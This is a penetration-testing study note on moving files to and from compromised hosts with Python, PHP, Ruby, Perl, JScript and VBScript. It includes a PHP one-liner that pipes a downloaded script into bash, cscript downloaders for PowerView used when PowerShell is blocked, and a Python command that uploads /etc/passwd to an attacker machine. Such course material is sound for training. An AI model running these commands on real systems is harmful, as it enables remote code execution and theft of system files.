# 04 — Transferring Files with Code

## Overview

Programming languages are often available on target machines and can be used for file transfers when standard tools (wget, cURL, PowerShell) are blocked or unavailable.

| Platform | Commonly Available |
|----------|--------------------|
| **Linux** | Python, PHP, Perl, Ruby |
| **Windows** | JavaScript (cscript), VBScript (cscript), Python (rare) |
| **Both** | Python (if installed) |

> **Key Insight:** There are ~700 programming languages. Any language that can make HTTP requests can be used for file transfers. Master a few, know the rest exist.

---

## Linux Download Methods

### Python 2

```bash
python2.7 -c 'import urllib;urllib.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

> ⚠️ Python 2.7 is EOL but still found on older systems.

### Python 3

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

> Python 2 uses `urllib.urlretrieve()`, Python 3 uses `urllib.request.urlretrieve()` — don't mix them up.

---

### PHP

PHP is used by **~77%** of websites with a known server-side language — you'll encounter it frequently on web servers.

#### Method 1: file_get_contents() + file_put_contents()

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

> Simple: read URL into variable → write variable to file.

#### Method 2: fopen() (Buffered Read)

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

> Reads in 1024-byte chunks — better for large files.

#### Method 3: Fileless — Pipe to Bash

```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

> `@file()` can use a URL as a filename if `fopen` wrappers are enabled. Pipes directly to bash for in-memory execution.

---

### Ruby

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---

### Perl

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---

### Linux Download Quick Reference

| Language | One-Liner Flag | Module/Function | Fileless? |
|----------|---------------|-----------------|-----------|
| **Python 3** | `-c` | `urllib.request.urlretrieve()` | ❌ |
| **Python 2** | `-c` | `urllib.urlretrieve()` | ❌ |
| **PHP** | `-r` | `file_get_contents()` | ❌ |
| **PHP** | `-r` | `fopen()` (buffered) | ❌ |
| **PHP** | `-r` | `@file()` + pipe to bash | ✅ |
| **Ruby** | `-e` | `Net::HTTP.get()` | ❌ |
| **Perl** | `-e` | `LWP::Simple::getstore()` | ❌ |

> **Remember the flags:** Python = `-c`, PHP = `-r`, Ruby/Perl = `-e`

---

## Windows Download Methods

### JavaScript (cscript.exe)

When PowerShell is blocked, JavaScript via `cscript.exe` is a fallback. Create a file called `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

#### Execute the Download

```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

> `WinHttp.WinHttpRequest.5.1` — Windows built-in COM object for HTTP requests.  
> `ADODB.Stream` — saves the binary response to a file.  
> `/nologo` — suppresses the cscript banner.

---

### VBScript (cscript.exe)

VBScript has been **installed by default on every Windows desktop since Windows 98**. Create `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

#### Execute the Download

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

> Same concept as JavaScript — uses COM objects (`Microsoft.XMLHTTP` + `Adodb.Stream`).

---

### Windows Script Quick Reference

| Method | Script File | Engine | Uses |
|--------|------------|--------|------|
| **JavaScript** | `wget.js` | `cscript.exe` | `WinHttp.WinHttpRequest.5.1` + `ADODB.Stream` |
| **VBScript** | `wget.vbs` | `cscript.exe` | `Microsoft.XMLHTTP` + `Adodb.Stream` |

> Both methods work from **cmd.exe or PowerShell** — useful when PowerShell script execution is restricted but `cscript.exe` isn't blocked.

---

## Upload Operations

### Python 3 Upload with requests Module

#### Step 1: Start Upload Server (Attack Machine)

```bash
python3 -m uploadserver
```

```
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Step 2: Upload from Target (One-Liner)

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

#### Step 2 Breakdown (Multi-Line for Understanding)

```python
# Import the requests module
import requests

# Define the target URL where we will upload the file
URL = "http://192.168.49.128:8000/upload"

# Open the file in binary read mode
file = open("/etc/passwd", "rb")

# POST request to upload the file
r = requests.post(URL, files={"files": file})
```

> **Note:** `requests` module may need to be installed (`pip install requests`). It's not part of the Python standard library.

---

## Attack Decision Tree

```
Need to transfer a file?
│
├── What languages are available on the target?
│   │
│   ├── Python 3? ──→ urllib.request.urlretrieve() (download)
│   │                  requests.post() (upload)
│   │
│   ├── Python 2? ──→ urllib.urlretrieve() (download)
│   │
│   ├── PHP? ──────→ file_get_contents() (simple)
│   │                 fopen() (large files)
│   │                 @file() | bash (fileless)
│   │
│   ├── Ruby? ─────→ Net::HTTP.get()
│   │
│   ├── Perl? ─────→ LWP::Simple::getstore()
│   │
│   └── Windows only (no Python/PHP)?
│       ├── cscript + wget.js  (JavaScript)
│       └── cscript + wget.vbs (VBScript)
│
└── Check: which -a python3 python2 php ruby perl
```

---

## Key Takeaways

1. **Always check what's installed:** `which python3 python2 php ruby perl` on Linux
2. **One-liner flags differ:** Python = `-c`, PHP = `-r`, Ruby/Perl = `-e`
3. **Windows fallback:** When PowerShell is blocked, `cscript.exe` with JS/VBS can still download files
4. **PHP is everywhere:** ~77% of web servers have it — your best bet after Python on Linux web servers
5. **Upload requires a receiver:** Start `uploadserver` or a similar listener on your attack machine first
6. **Build redundancy:** Like the cURL → wget → Python fallback chain from Section 03, always have multiple language options ready
